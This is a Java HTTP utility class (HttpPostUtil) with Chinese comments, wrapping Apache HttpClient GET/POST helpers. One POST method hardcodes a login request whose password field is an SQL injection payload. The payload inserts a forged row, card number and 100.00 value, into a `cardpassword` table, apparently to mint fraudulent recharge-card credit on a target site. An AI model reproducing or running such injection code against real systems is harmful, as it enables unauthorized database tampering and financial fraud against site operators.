package com.util;

import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

public class HttpPostUtil {
	private static CloseableHttpClient HttpClient = null;

	public static String getHttpData(String url, String refererUrl, CloseableHttpClient closeableHttpClient) {
		String content = null;
		try {
			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Referer", refererUrl);
			HttpResponse httpResponse = closeableHttpClient.execute(httpGet);
			HttpEntity httpEntity = httpResponse.getEntity();
			if (httpEntity != null) {
				content = EntityUtils.toString(httpEntity);
			}
			httpGet.abort();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return content;
	}

	public static String getHttpData(String url, String refererUrl) {
		if (HttpClient == null) {
			HttpClient = HttpClients.createDefault();
		}
		String content = null;
		try {
			// 创建 httpUriRequest 实例
			HttpPost httppost = new HttpPost(url);

			// 建立HttpPost对象
			List<NameValuePair> params = new ArrayList<NameValuePair>();
			// 建立一个NameValuePair数组，用于存储欲传送的参数
			params.add(new BasicNameValuePair("userName", "admin"));
			params.add(new BasicNameValuePair("pwd", "admin';INSERT INTO `cardpassword` (`randomNo`, `cardPwd`, `money`,`date`) VALUES ('445838161407', 'E45D860DF3F3E8DFFDC0A2A21C00C25D','100.00', '2016-03-19 19:25:18');#"));
//			params.add(new BasicNameValuePair("pwd", "admin"));
			// 添加参数
			httppost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
			// System.out.println("uri=" + httpGet.getURI());
			httppost.addHeader("Referer", refererUrl);
			// 执行 get 请求
			HttpResponse httpResponse = HttpClient.execute(httppost);
			// 获取响应实体
			HttpEntity httpEntity = httpResponse.getEntity();
			if (httpEntity != null) {
				content = EntityUtils.toString(httpEntity);
			}
			// 有些教程里没有下面这行
			httppost.abort();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return content;
	}

	// 创建默认的 HttpClient 实例
	public static CloseableHttpClient createHttpClient() {
		return HttpClients.createDefault();
	}

	public static void CloseHttpClient() {
		try {
			HttpClient.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void CloseHttpClient(CloseableHttpClient closeableHttpClient) {
		try {
			closeableHttpClient.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void openBrowseURL(String url) {
		Desktop desktop = Desktop.getDesktop();
		try {
			desktop.browse(new URI(url));
		} catch (Exception e1) {
			e1.printStackTrace();
		}
	}

}
